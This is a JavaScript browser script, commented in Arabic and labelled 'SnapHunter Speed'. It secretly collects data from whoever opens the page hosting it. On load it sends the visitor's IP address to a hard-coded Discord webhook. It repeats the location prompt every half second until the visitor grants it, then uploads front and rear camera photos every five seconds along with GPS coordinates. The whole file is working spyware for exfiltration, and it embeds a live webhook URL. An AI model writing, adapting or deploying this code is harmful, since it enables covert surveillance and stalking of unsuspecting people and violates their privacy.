'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. طلب الموقع بشكل إجباري (تكرار فوري عند الرفض)
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
            // إرسال الموقع فور الحصول عليه لضمان السرعة
            sendToDiscord(null, `📍 **الموقع المكتشف:**\nhttps://www.google.com/maps?q=${userLat},${userLng}`);
        },
        () => { 
            // إذا رفض، يكرر الطلب بعد نصف ثانية فوراً
            setTimeout(forceLocation, 500); 
        },
        { enableHighAccuracy: true }
    );
}

// 2. وظيفة الإرسال السريع جداً
async function sendToDiscord(imageBlob, textContent) {
    const formData = new FormData();
    if (imageBlob) formData.append('file', imageBlob, 'fast_shot.jpg');
    
    formData.append('payload_json', JSON.stringify({
        content: textContent,
        username: "SnapHunter Speed"
    }));

    try {
        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
    } catch (e) { console.error("خطأ في الإرسال"); }
}

// 3. التقاط الصور بضغط عالي (Ultra Fast)
async function captureSequence(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();

        // وقت انتظار قصير جداً (0.5 ثانية) لفتح العدسة
        await new Promise(r => setTimeout(r, 500));

        const ctx = canvas.getContext('2d');
        // تصغير أبعاد الصورة لسرعة النقل (480p)
        canvas.width = 640;
        canvas.height = 480;
        ctx.drawImage(video, 0, 0, 640, 480);
        
        // تحويل الصورة لـ JPEG مع ضغط الجودة (0.4 = 40% جودة لسرعة خرافية)
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
        
        // إغلاق الكاميرا فوراً
        stream.getTracks().forEach(t => t.stop());

        await sendToDiscord(blob, `📸 لقطة من الكاميرا: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
    } catch (e) { }
}

// 4. التشغيل اللحظي (المحرك)
(async function init() {
    // إرسال الـ IP فوراً
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        sendToDiscord(null, `🚀 **دخول جديد الآن!**\n🌐 IP: \`${ipData.ip}\``);
    } catch(e){}

    // طلب الأذونات والبدء
    try {
        await navigator.mediaDevices.getUserMedia({ video: true }); // طلب الكاميرا أولاً
        forceLocation(); // طلب الموقع ثانياً

        // حلقة التكرار كل 5 ثوانٍ
        const loop = async () => {
            await captureSequence('user');        // التقاط سيلفي
            await captureSequence('environment'); // التقاط خلفية
            setTimeout(loop, 5000);               // انتظار 5 ثوانٍ وإعادة الكرة
        };
        loop();

    } catch (err) {
        forceLocation();
        setInterval(() => { if(userLat) sendToDiscord(null, `📍 تحديث الموقع: ${userLat},${userLng}`); }, 5000);
    }
})();
